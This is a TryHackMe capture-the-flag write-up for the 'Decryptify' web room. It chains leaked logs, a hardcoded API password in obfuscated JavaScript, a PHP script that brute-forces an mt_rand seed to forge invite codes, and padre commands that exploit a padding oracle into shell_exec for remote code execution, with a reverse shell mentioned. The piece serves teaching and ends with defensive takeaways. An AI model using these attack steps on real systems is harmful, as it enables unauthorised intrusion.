# Decryptify — TryHackMe Writeup

**Difficulty:** Intermediate  
**Category:** Web Hacking

---

## Overview

Decryptify is a web hacking room that chains several vulnerabilities together — from information disclosure all the way to remote code execution via a padding oracle attack. It's one of those rooms where every finding feeds into the next, which made it really satisfying to work through.

---

## Reconnaissance

Started with a basic nmap scan which only showed port 22 open. Port 80 didn't show up which was weird, so I did a full port scan:

```bash
nmap -sV -p- -T4 <IP>
```

Found port 1337 running a web server. From there gobuster revealed `/logs/`, `/js/`, `/phpmyadmin/`, and the main pages `index.php`, `dashboard.php`, and `api.php`.

---

## Information Disclosure

The logs directory had directory listing enabled and contained a single log file. Reading through it told an interesting story — someone had generated an invite code for `alpha@fake.thm`, then deactivated that account and created a new one `hello@fake.thm`.

The invite code was base64 encoded:
```
MTM0ODMzNzEyMg== → 1348337122
```

---

## Hardcoded Credentials in JavaScript

The API endpoint at `/api.php` required a password. Checking the JS files in `/js/`, I found `api.js` which was obfuscated. The obfuscation was purely cosmetic though — scanning the string array manually, one value stood out immediately from the rest:

```
H7gY2tJ9wQzD4rS1
```

Everything else in the array was short numeric-looking strings used for the obfuscation math. This one had deliberately mixed case and length that screamed "password." Sure enough it worked on the API.

The lesson here: obfuscation is not security. The code still has to run in the browser, so any secret inside it belongs to whoever is looking.

---

## Insecure Randomness — Invite Code Forgery

The API documentation exposed the invite code generation algorithm:

```php
function calculate_seed_value($email, $constant_value) {
    $email_length = strlen($email);
    $email_hex = hexdec(substr($email, 0, 8));
    $seed_value = hexdec($email_length + $constant_value + $email_hex);
    return $seed_value;
}
$seed_value = calculate_seed_value($email, $constant_value);
mt_srand($seed_value);
$random = mt_rand();
$invite_code = base64_encode($random);
```

PHP's `mt_rand()` is a pseudorandom number generator — given the same seed it always produces the same output. The seed was derived entirely from the email address plus an unknown constant.

Since I knew alpha's invite code (`1348337122`) and could calculate the email-derived part of the seed, I brute forced the constant:

```bash
php -r "
\$email_length = 14;
\$email_hex = 43770;
for (\$c = 0; \$c <= 2000000; \$c++) {
    \$seed = hexdec(\$email_length + \$c + \$email_hex);
    mt_srand(\$seed);
    if (mt_rand() == 1348337122) {
        echo 'constant: ' . \$c . '\n';
        break;
    }
}
"
```

Constant came back as `99999` — probably intentional. Applied the same formula to `hello@fake.thm` and generated a valid invite code, which I used to log in.

---

## Padding Oracle Attack — RCE

After logging in, the dashboard footer contained a hidden form field:

```html
<input type="hidden" name="date" value="AazRi0nz+Ts4tzSm2OYR92MgQhec9qoontwgmLJHYuM=">
```

Passing this as a GET parameter to `dashboard.php` rendered the year `2026` in the footer. Passing garbage returned:

```
Padding error: EVP_DecryptFinal_ex: wrong final block length
```

This is a classic padding oracle. The server was leaking whether AES-CBC decryption padding was valid or not — that single bit of information is enough to both decrypt existing ciphertexts and forge new ones.

Using `padre` to exploit it:

```bash
# First decrypt the original to understand the plaintext format
./padre -u "http://<IP>:1337/dashboard.php?date=$" \
    -cookie "PHPSESSID=<session>" \
    -err "Padding error" \
    "AazRi0nz+Ts4tzSm2OYR92MgQhec9qoontwgmLJHYuM="
```

Output: `date +%Y\x08\x08\x08\x08\x08\x08\x08\x08`

The server was decrypting the parameter and passing it directly to `shell_exec()`. The backspace characters were just padding to fill the 16-byte block.

Forging a ciphertext that decrypts to `id`:

```bash
./padre -u "http://<IP>:1337/dashboard.php?date=$" \
    -cookie "PHPSESSID=<session>" \
    -err "Padding error" \
    -p "id"
```

Sending the resulting ciphertext returned `uid=33(www-data)` in the footer — confirmed RCE.

From there I hosted a reverse shell script and used the padding oracle to encrypt a curl command to fetch and execute it, getting a shell on the box.

---

## Vulnerability Summary

| Vulnerability | Impact |
|---|---|
| Log file disclosure | Leaked invite code and user information |
| Hardcoded JS credentials | API access |
| Insecure PRNG (mt_rand) | Forged invite codes → authentication bypass |
| CBC padding oracle + shell_exec | Remote code execution |

---

## Key Takeaways

- Always do a full port scan — default nmap misses a lot
- Obfuscated JavaScript still runs in the browser, so any secret inside it is readable
- `mt_rand()` should never be used for security tokens — use `random_bytes()` instead
- AES-CBC without a MAC allows ciphertext tampering. Use authenticated encryption (AES-GCM) or at minimum validate with HMAC before decrypting
- Never pass decrypted user input to `shell_exec()`
